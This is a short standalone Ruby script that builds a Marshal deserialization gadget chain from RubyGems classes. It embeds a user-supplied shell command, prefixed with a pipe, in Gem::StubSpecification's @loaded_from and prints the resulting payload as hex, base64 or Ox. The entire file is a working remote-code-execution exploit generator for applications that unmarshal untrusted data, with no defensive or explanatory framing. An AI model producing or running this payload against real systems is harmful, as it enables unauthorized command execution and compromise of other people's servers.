#!/usr/bin/env ruby

require 'ox'
require 'optparse'
require 'base64'

class Gem::StubSpecification
  def initialize; end
end

options = { format: nil }

OptionParser.new do |opts|
  opts.banner = "Usage: ruby script.rb [options] <COMMAND>"

  opts.on("--format FORMAT", [:hex, :base64, :ox, :all], "Output format: hex, base64, 0x, or all (default base64 + hex)") do |format|
    options[:format] = format
  end
end.parse!

# Check if a command is provided as a command-line argument
if ARGV.empty?
  puts "Usage: ruby script.rb [options] <COMMAND>"
  exit 1
end

command_to_execute = ARGV.join(' ')

stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|#{command_to_execute}")

class Gem::Source::SpecificFile
  def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

$dependency_list = Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

class Gem::Requirement
  def marshal_dump
    [$dependency_list]
  end
end

payload = Marshal.dump(Gem::Requirement.new)

case options[:format]
when :hex
  puts payload.unpack('H*')[0]
when :base64
  puts Base64.encode64(payload).tr("\n", '')
when :ox
  puts "0x#{payload.unpack('H*')[0]}"
when :all
  puts payload.unpack('H*')[0]
  puts Base64.encode64(payload).tr("\n", '')
  puts "---start----Ox---Payload"
  puts Ox.dump(Gem::Requirement.new.marshal_dump)
else
  puts payload.unpack('H*')[0]
  puts Base64.encode64(payload).tr("\n", '')
end
